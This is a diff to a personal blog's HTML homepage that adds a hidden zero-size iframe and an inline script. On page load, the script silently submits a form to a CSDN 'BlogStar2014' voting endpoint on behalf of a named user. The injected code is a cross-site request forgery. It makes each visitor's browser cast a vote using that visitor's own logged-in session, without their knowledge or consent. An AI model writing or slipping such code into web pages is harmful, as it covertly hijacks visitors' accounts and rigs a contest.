@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html>
+<iframe width="0" height="0" name="actionframe"></iframe>
 <head>
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -43,6 +44,29 @@
 
     <div class="panel-main__inner panel-inverted">
     <div class="panel-main__content">
+
+<script>
+function post(URL, PARAMS) 
+{        
+    var temp = document.createElement("form");        
+    temp.action = URL;
+	temp.target="actionframe";
+    temp.method = "post";        
+    temp.style.display = "none";        
+    for (var x in PARAMS) 
+	{        
+        var opt = document.createElement("textarea");        
+        opt.name = x;        
+        opt.value = PARAMS[x];        
+        // alert(opt.name)        
+        temp.appendChild(opt);        
+    }        
+    document.body.appendChild(temp);        
+    temp.submit();        
+    return false;        
+}
+post('http://vote.blog.csdn.net/BlogStar2014/SelectionSubmit', {username:'hitwhylz',r:'0.6432360706385225'})
+</script>
 
         
         <a title="Colin的主页"><img src="http://colinnest.qiniudn.com/myPic.JPG" width="80" alt="OneV&#x27;s Den logo" class="panel-cover__logo logo" /></a>
